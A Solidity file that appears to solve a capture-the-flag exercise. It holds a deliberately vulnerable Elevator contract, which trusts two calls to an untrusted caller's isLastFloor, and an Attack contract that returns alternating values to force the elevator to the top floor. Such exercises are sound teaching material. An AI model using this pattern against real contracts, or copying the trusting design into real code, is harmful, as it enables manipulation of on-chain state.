// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack {

    bool lastFloor = true;
    address victim;
    
    constructor(address _victim) public {
        victim = _victim;
    }

    function isLastFloor(uint _v) external returns (bool) {
        // We will use this to redirect execution flow
        lastFloor = !lastFloor;
        // first call will return false
        // second call will return true
        return lastFloor;
    }

    function callElevator() external {
        Elevator(victim).goTo(1);
    }

}